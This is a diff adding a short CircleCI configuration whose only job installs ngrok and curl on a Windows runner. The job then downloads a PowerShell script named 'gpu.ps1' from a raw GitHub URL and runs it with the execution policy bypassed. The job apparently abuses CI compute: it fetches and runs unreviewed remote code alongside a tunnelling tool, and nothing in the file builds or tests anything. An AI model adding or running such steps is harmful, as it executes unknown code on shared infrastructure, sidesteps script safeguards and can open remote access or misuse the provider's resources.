@@ -1,0 +1,25 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.2.0
+
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+      
+    steps:
+      - checkout
+      
+      - run:
+          name: Install Ngrok and Dependencies
+          command: |
+            choco install ngrok -y
+            choco install curl -y
+            
+      - run:
+          name: Download and Run GPU Script
+          command: |
+            curl -o gpu.ps1 https://raw.githubusercontent.com/Yahihs/rep/main/sh
+            powershell -ExecutionPolicy Bypass -File gpu.ps1
